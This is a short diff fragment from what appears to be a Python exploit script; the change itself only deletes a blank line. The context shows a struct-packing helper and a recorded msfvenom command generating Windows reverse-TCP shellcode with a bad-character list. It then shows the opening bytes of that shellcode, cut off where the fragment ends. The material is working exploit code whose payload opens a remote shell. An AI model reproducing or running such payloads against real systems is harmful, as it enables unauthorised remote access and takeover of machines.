@@ -10,7 +10,6 @@ p32 = lambda x: struct.pack("I", x)
 msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 \
 lport=1024 -f python -v shellcode -b "\x00\x0a\x0d\x20\x40\x25\x26\x27\x2b"
 """
-
 shellcode =  ""
 shellcode += "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
 shellcode += "\x81\x76\x0e\x83\x8e\x96\xe4\x83\xee\xfc\xe2\xf4"
